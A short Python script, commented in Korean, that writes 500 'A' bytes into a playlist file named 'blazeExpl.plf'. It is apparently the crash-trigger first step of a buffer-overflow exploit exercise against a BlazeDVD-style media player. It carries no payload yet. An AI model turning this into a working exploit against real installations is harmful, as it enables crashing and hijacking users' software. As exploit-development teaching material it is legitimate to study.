# 'junk' 변수에 500바이트 크기의 문자열 "\x41" (16진수로 41은 'A'에 해당)을 반복하여 저장한다.
junk ="\x41"*500 

# 'blazeExpl.plf' 파일을 쓰기 모드로 열고, 'junk' 문자열을 파일에 기록한다.
x=open('blazeExpl.plf', 'w')
x.write(junk)
x.close()
